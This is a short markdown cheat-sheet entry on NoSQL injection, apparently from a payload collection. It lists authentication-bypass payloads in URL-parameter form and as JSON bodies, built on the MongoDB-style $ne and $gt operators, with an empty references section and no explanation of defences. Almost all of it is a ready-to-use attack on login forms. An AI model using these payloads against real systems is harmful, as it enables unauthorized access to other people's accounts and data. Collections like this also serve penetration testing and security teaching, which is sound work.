# NoSQLInjection

## Exploit
Basic authentication bypass using not equal ($ne) or greater ($gt)
```
in URL
username[$ne]=toto&password[$ne]=toto

in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

# References:
- 
-
